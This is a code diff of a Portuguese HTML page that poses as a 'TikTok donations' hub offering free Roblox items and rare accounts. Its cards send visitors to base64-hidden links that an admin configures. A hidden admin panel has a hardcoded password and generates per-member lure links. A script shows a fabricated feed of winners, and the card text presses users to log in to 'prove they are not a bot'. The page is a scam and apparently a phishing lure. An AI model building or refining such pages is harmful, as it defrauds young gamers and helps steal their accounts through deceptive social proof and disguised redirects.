@@ -3,189 +3,288 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account System | Crazzy Beam</title>
+    <title>Doações Tik Tok | Oficial</title>
     <style>
         :root {
-            --primary: #8a2be2;
-            --bg: #0d0516;
-            --glass: rgba(255, 255, 255, 0.05);
-            --neon: #bc13fe;
-            --text: #e0e0e0;
+            --primary-purple: #8a2be2;
+            --bg-dark: #0f051a;
+            --neon-purple: #bc13fe;
+            --glass-purple: rgba(138, 43, 226, 0.15);
+            --border-purple: rgba(188, 19, 254, 0.4);
         }
 
         body {
-            margin: 0; font-family: 'Segoe UI', sans-serif;
-            background: var(--bg); color: var(--text);
-            min-height: 100vh; display: flex; flex-direction: column;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg-dark);
+            background-image: radial-gradient(circle at center, #2e0854 0%, #0f051a 100%);
+            color: #ffffff;
+            min-height: 100vh;
         }
 
-        /* Navbar */
+        /* Navbar Roxa */
         nav {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 15px 5%; background: rgba(0,0,0,0.6); 
-            border-bottom: 2px solid var(--primary); backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 5%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            border-bottom: 2px solid var(--neon-purple);
+            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
         }
 
-        .logo { font-weight: bold; color: var(--neon); letter-spacing: 2px; font-size: 1.2rem; }
-        .admin-trigger { cursor: pointer; opacity: 0.3; font-size: 0.8rem; }
+        .logo { font-weight: 900; color: #fff; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon-purple); }
+        .admin-trigger { cursor: pointer; opacity: 0.3; font-size: 0.8rem; color: var(--neon-purple); }
 
-        /* Container Central */
-        .main-container {
-            flex: 1; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; padding: 20px;
-        }
+        .main-container { max-width: 650px; margin: 30px auto; padding: 20px; }
 
+        /* Painel ADM */
         .glass-card {
-            background: var(--glass); backdrop-filter: blur(15px);
-            padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1);
-            width: 100%; max-width: 450px; text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            background: var(--glass-purple);
+            backdrop-filter: blur(15px);
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid var(--border-purple);
+            margin-bottom: 25px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
         }
 
         input {
             width: 100%; padding: 12px; margin: 10px 0;
-            background: rgba(0,0,0,0.4); border: 1px solid var(--primary);
+            background: rgba(0,0,0,0.5); border: 1px solid var(--neon-purple);
             color: white; border-radius: 8px; box-sizing: border-box; outline: none;
         }
 
         button {
             width: 100%; padding: 14px; border: none; border-radius: 8px;
-            background: linear-gradient(45deg, var(--primary), var(--neon));
-            color: white; font-weight: bold; cursor: pointer;
-            text-transform: uppercase; transition: 0.3s;
+            background: linear-gradient(45deg, var(--primary-purple), var(--neon-purple));
+            color: white; font-weight: bold; cursor: pointer; margin-top: 10px;
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.4);
+            transition: 0.3s;
+        }
+        button:hover { transform: scale(1.02); filter: brightness(1.2); }
+
+        /* Cards de Doação com GIF */
+        .donation-card {
+            background: rgba(20, 10, 30, 0.8);
+            border: 1px solid var(--border-purple);
+            border-radius: 18px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            transition: 0.3s;
+            cursor: pointer;
+            position: relative;
         }
 
-        button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4); }
+        .donation-card:hover { border-color: #fff; box-shadow: 0 0 25px var(--neon-purple); }
 
-        /* Feed Fake */
+        .card-header-gif {
+            width: 100%;
+            height: 120px;
+            object-fit: cover;
+            border-bottom: 1px solid var(--border-purple);
+            opacity: 0.8;
+        }
+
+        .card-body { padding: 15px; }
+        .card-body h3 { margin: 0 0 8px 0; color: var(--neon-purple); text-transform: uppercase; font-size: 1.1rem; }
+        .card-body p { margin: 0; font-size: 0.85rem; color: #d1b3ff; line-height: 1.4; }
+
+        /* Feed Fake Roxo */
         .fake-feed {
-            margin-top: 25px; width: 100%; max-width: 400px;
-            background: rgba(0,0,0,0.2); border-radius: 10px;
-            padding: 10px; font-size: 0.85rem; overflow: hidden; height: 100px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 12px;
+            height: 90px;
+            overflow: hidden;
+            font-size: 0.85rem;
+            border: 1px solid var(--border-purple);
         }
-
-        .feed-item {
-            display: flex; align-items: center; gap: 10px; margin-bottom: 8px;
-            animation: slideUp 0.5s ease-out;
-        }
-
-        .avatar-fake { width: 25px; height: 25px; background: #555; border-radius: 50%; }
-
-        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .feed-item { animation: fadeInUp 0.6s ease; margin-bottom: 6px; color: #e0b0ff; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
 
         .hidden { display: none; }
-        .success-link { color: #00ff88; word-break: break-all; margin-top: 10px; font-size: 0.8rem; }
+        #copy-area { 
+            margin-top: 20px; 
+            padding: 15px; 
+            background: rgba(0,0,0,0.8); 
+            border-radius: 10px; 
+            border: 1px dashed var(--neon-purple);
+        }
     </style>
 </head>
 <body>
 
 <nav>
-    <div class="logo">ACCOUNT SYSTEM</div>
+    <div class="logo">DOAÇÕES TIK TOK</div>
     <div class="admin-trigger" onclick="toggleAdmin()">⚙️ ADM</div>
 </nav>
 
 <div class="main-container">
-    
+
     <div id="panel-adm" class="glass-card hidden">
-        <h2 style="color: gold;">PAINEL ADMIN</h2>
+        <h2 style="text-align:center; color: #fff;">SISTEMA 7n</h2>
         <div id="adm-auth">
             <input type="text" id="adm-user" placeholder="Usuário">
             <input type="password" id="adm-pass" placeholder="Senha">
-            <button onclick="loginAdmin()">Entrar</button>
+            <button onclick="loginAdmin()">Entrar no Painel</button>
         </div>
         
         <div id="adm-content" class="hidden">
-            <p>Gerar Novo Link de Membro</p>
-            <input type="text" id="input-disc" placeholder="Nome Discord do Membro">
-            <input type="text" id="input-roblox" placeholder="Link do Roblox">
-            <button onclick="gerarLinkMembro()">Gerar Link Único</button>
-            <div id="result-link" class="success-link"></div>
+            <h3 style="color: var(--neon-purple);">Configurar Novo Membro</h3>
+            <input type="text" id="membro-nome" placeholder="Nome do Membro (Ex: Crazzy Beam)">
+            <hr style="border: 0.5px solid var(--border-purple);">
+            <input type="text" id="link-gen" placeholder="Link 🪄 Gen Contas">
+            <input type="text" id="link-mm2" placeholder="Link 🗡️ MM2">
+            <input type="text" id="link-tsunami" placeholder="Link 🌪️ Tsunami">
+            <input type="text" id="link-brainrot" placeholder="Link 🏚️ Brainrot">
+            <input type="text" id="link-blox" placeholder="Link 🎃 Blox Fruits">
+            <input type="text" id="link-robux" placeholder="Link ❄️ Robux">
+            
+            <button onclick="gerarLinkMultiplo()">GERAR E SALVAR CONFIGURAÇÃO</button>
+            
+            <div id="copy-area">
+                <p style="font-size: 0.8rem; margin-bottom: 5px;">Link Pronto para Divulgação:</p>
+                <p id="final-url" style="font-size: 0.7rem; color: #00ff88; background: #000; padding: 10px; border-radius: 5px; word-break: break-all;"></p>
+                <button onclick="copyToClipboard()" style="background: #fff; color: #000; margin-top: 10px;">COPIAR LINK AUTOMÁTICO</button>
+            </div>
         </div>
     </div>
 
-    <div id="panel-gen" class="glass-card">
-        <h1 id="gen-title">GERADOR PRO</h1>
-        <p id="gen-desc">Iniciando sistema de validação automática...</p>
-        
-        <button onclick="redirectRoblox()" id="btn-main-gen">GEN CONTAS</button>
+    <div id="panel-hub">
+        <h2 id="welcome-msg" style="text-align: center; margin-bottom: 10px;">🎁 Central de Doações</h2>
+        <p style="text-align: center; font-size: 0.9rem; color: #d1b3ff; margin-bottom: 30px;">
+            Abaixo estão as doações ativas. Escolha uma categoria!
+        </p>
 
-        <div class="fake-feed" id="feed-container">
+        <div class="donation-card" onclick="irPara('gen')">
+            <img src="https://cdn.discordapp.com/attachments/1469333337897304229/1472504710937448620/063e2799b5df4378a7d0c704bbc76af1.gif?ex=6994caa0&is=69937920&hm=af1fa83b08bc238fc94eb31c66a4c57f8c9b2ea7aeefd6caf0d5266d0d528591&" class="card-header-gif">
+            <div class="card-body">
+                <h3>🪄 Gen Contas</h3>
+                <p>Gerador De Contas Raras, Façam Login Para Certifica-Se Se Não E Um Bot!</p>
             </div>
-    </div>
+        </div>
 
+        <div class="donation-card" onclick="irPara('mm2')">
+            <img src="https://cdn.discordapp.com/attachments/1469333337897304229/1472504710937448620/063e2799b5df4378a7d0c704bbc76af1.gif?ex=6994caa0&is=69937920&hm=af1fa83b08bc238fc94eb31c66a4c57f8c9b2ea7aeefd6caf0d5266d0d528591&" class="card-header-gif">
+            <div class="card-body">
+                <h3>🗡️ Mm2 (Doação)</h3>
+                <p>Entre E Ganha Facas Godly Muito Mais, Um Bot Entrega As Facas Automática!</p>
+            </div>
+        </div>
+
+        <div class="donation-card" onclick="irPara('tsunami')">
+            <img src="https://cdn.discordapp.com/attachments/1469333337897304229/1472504710937448620/063e2799b5df4378a7d0c704bbc76af1.gif?ex=6994caa0&is=69937920&hm=af1fa83b08bc238fc94eb31c66a4c57f8c9b2ea7aeefd6caf0d5266d0d528591&" class="card-header-gif">
+            <div class="card-body">
+                <h3>🌪️ Fuja Do Tsunami (Doação)</h3>
+                <p>Doamos Infinity, Divinos, Celestial, Basta Entrar No Nosso Serve Privado!</p>
+            </div>
+        </div>
+
+        <div class="donation-card" onclick="irPara('brainrot')">
+            <img src="https://cdn.discordapp.com/attachments/1469333337897304229/1472504710937448620/063e2799b5df4378a7d0c704bbc76af1.gif?ex=6994caa0&is=69937920&hm=af1fa83b08bc238fc94eb31c66a4c57f8c9b2ea7aeefd6caf0d5266d0d528591&" class="card-header-gif">
+            <div class="card-body">
+                <h3>🏚️ Roube Um Brainrot (Doação)</h3>
+                <p>Doação De Secretos Raros Ex: Garama, Dragon, La Grande, Ketupat Etc!</p>
+            </div>
+        </div>
+
+        <div class="donation-card" onclick="irPara('blox')">
+            <img src="https://cdn.discordapp.com/attachments/1469333337897304229/1472504710937448620/063e2799b5df4378a7d0c704bbc76af1.gif?ex=6994caa0&is=69937920&hm=af1fa83b08bc238fc94eb31c66a4c57f8c9b2ea7aeefd6caf0d5266d0d528591&" class="card-header-gif">
+            <div class="card-body">
+                <h3>🎃 Blox Fruits (Doação)</h3>
+                <p>Doação De Frutas Perm, Doação De Games Pass, Doação De Frutas Física!</p>
+            </div>
+        </div>
+
+        <div class="donation-card" onclick="irPara('robux')">
+            <img src="https://cdn.discordapp.com/attachments/1469333337897304229/1472504710937448620/063e2799b5df4378a7d0c704bbc76af1.gif?ex=6994caa0&is=69937920&hm=af1fa83b08bc238fc94eb31c66a4c57f8c9b2ea7aeefd6caf0d5266d0d528591&" class="card-header-gif">
+            <div class="card-body">
+                <h3>❄️ Doação De Robux</h3>
+                <p>Comunidade Bem Sucedida E Doamos Para Pessoas Que Não Tem Condição!</p>
+            </div>
+        </div>
+
+        <div class="fake-feed" id="feed-container"></div>
+    </div>
 </div>
 
 <script>
-    // --- CONFIGURAÇÃO ---
     const ADM_USER = "CrazzyBeamers";
     const ADM_PASS = "CrazzyBeamers";
-    
-    // Captura o link do Roblox da URL (Ex: site.com?rbx=https://...)
-    const urlParams = new URLSearchParams(window.location.search);
-    let robloxLink = urlParams.get('rbx') ? atob(urlParams.get('rbx')) : "https://www.roblox.com";
-    let nomeDono = urlParams.get('owner') ? atob(urlParams.get('owner')) : "Sistema";
 
-    // Ajusta o título conforme o dono do link
-    if(urlParams.get('owner')) {
-        document.getElementById('gen-title').innerText = "GERADOR DE " + nomeDono;
+    // Pega os links da URL e decodifica
+    const params = new URLSearchParams(window.location.search);
+    const links = {
+        gen: params.get('l1') ? atob(params.get('l1')) : "#",
+        mm2: params.get('l2') ? atob(params.get('l2')) : "#",
+        tsunami: params.get('l3') ? atob(params.get('l3')) : "#",
+        brainrot: params.get('l4') ? atob(params.get('l4')) : "#",
+        blox: params.get('l5') ? atob(params.get('l5')) : "#",
+        robux: params.get('l6') ? atob(params.get('l6')) : "#"
+    };
+
+    if(params.get('m')) {
+        document.getElementById('welcome-msg').innerText = "🎁 Doações de " + atob(params.get('m'));
     }
 
-    // --- FUNÇÕES ADM ---
+    function irPara(id) {
+        if(links[id] === "#") return alert("Atenção: Este link ainda não foi configurado pelo ADM!");
+        window.location.href = links[id];
+    }
+
+    // LOGICA ADM
     function toggleAdmin() {
         document.getElementById('panel-adm').classList.toggle('hidden');
-        document.getElementById('panel-gen').classList.toggle('hidden');
+        document.getElementById('panel-hub').classList.toggle('hidden');
     }
 
     function loginAdmin() {
-        const u = document.getElementById('adm-user').value;
-        const p = document.getElementById('adm-pass').value;
-        if(u === ADM_USER && p === ADM_PASS) {
+        if(document.getElementById('adm-user').value === ADM_USER && document.getElementById('adm-pass').value === ADM_PASS) {
             document.getElementById('adm-auth').classList.add('hidden');
             document.getElementById('adm-content').classList.remove('hidden');
-        } else {
-            alert("Acesso Negado!");
-        }
+        } else { alert("Senha Incorreta!"); }
     }
 
-    function gerarLinkMembro() {
-        const disc = document.getElementById('input-disc').value;
-        const rbx = document.getElementById('input-roblox').value;
-        
-        if(!disc || !rbx) return alert("Preencha tudo!");
+    function gerarLinkMultiplo() {
+        const m = btoa(document.getElementById('membro-nome').value);
+        const l1 = btoa(document.getElementById('link-gen').value);
+        const l2 = btoa(document.getElementById('link-mm2').value);
+        const l3 = btoa(document.getElementById('link-tsunami').value);
+        const l4 = btoa(document.getElementById('link-brainrot').value);
+        const l5 = btoa(document.getElementById('link-blox').value);
+        const l6 = btoa(document.getElementById('link-robux').value);
 
-        // Codifica os dados na URL para criar o link único
         const base = window.location.href.split('?')[0];
-        const linkFinal = `${base}?owner=${btoa(disc)}&rbx=${btoa(rbx)}`;
+        const linkPronto = `${base}?m=${m}&l1=${l1}&l2=${l2}&l3=${l3}&l4=${l4}&l5=${l5}&l6=${l6}`;
         
-        document.getElementById('result-link').innerHTML = `Link gerado para <b>${disc}</b>:<br>${linkFinal}`;
+        document.getElementById('final-url').innerText = linkPronto;
+        document.getElementById('copy-area').style.display = 'block';
     }
 
-    // --- FUNÇÕES GERADOR ---
-    function redirectRoblox() {
-        document.getElementById('btn-main-gen').innerText = "PROCESSANDO...";
-        setTimeout(() => {
-            window.location.href = robloxLink;
-        }, 1500);
+    function copyToClipboard() {
+        const url = document.getElementById('final-url').innerText;
+        navigator.clipboard.writeText(url).then(() => {
+            alert("Sucesso! Link copiado para enviar ao membro.");
+        });
     }
 
-    // --- FEED FAKE ---
-    const nomesFakes = ["Dudu_v3", "SrNinguém", "LucasFPS", "CrazzyFan", "Kadu.rbx", "Xit_Lover", "Mel_Ofc"];
-    function addFakeActivity() {
-        const feed = document.getElementById('feed-container');
-        const nome = nomesFakes[Math.floor(Math.random() * nomesFakes.length)];
-        const item = document.createElement('div');
-        item.className = 'feed-item';
-        item.innerHTML = `
-            <div class="avatar-fake" style="background: hsl(${Math.random()*360}, 50%, 50%)"></div>
-            <span><b>${nome}</b> acabou de gerar uma conta rara!</span>
-        `;
+    // FEED FAKE (TOTAL PURPLE)
+    const acoes = ["acabou de ganhar Kitsune Perm!", "resgatou 5000 Robux!", "recebeu Set Godly MM2!", "ganhou Secret no Brainrot!", "gerou conta 2016 rara!"];
+    const nomes = ["Dark_Ninja", "Lari_Blox", "Zezinho_Rbx", "Crazzy_Fan", "Membro_Vip", "Rei_do_Xit"];
+    
+    function addFeedItem() {
+        const container = document.getElementById('feed-container');
+        const el = document.createElement('div');
+        el.className = 'feed-item';
+        el.innerHTML = `💜 <b>${nomes[Math.floor(Math.random()*nomes.length)]}</b> ${acoes[Math.floor(Math.random()*acoes.length)]}`;
         
-        if(feed.children.length > 2) feed.removeChild(feed.firstChild);
-        feed.appendChild(item);
+        if(container.children.length > 2) container.removeChild(container.firstChild);
+        container.appendChild(el);
     }
-
-    setInterval(addFakeActivity, 4000); // Adiciona um fake a cada 4 segundos
-    addFakeActivity(); 
+    setInterval(addFeedItem, 3500);
+    addFeedItem();
 </script>
 
 </body>
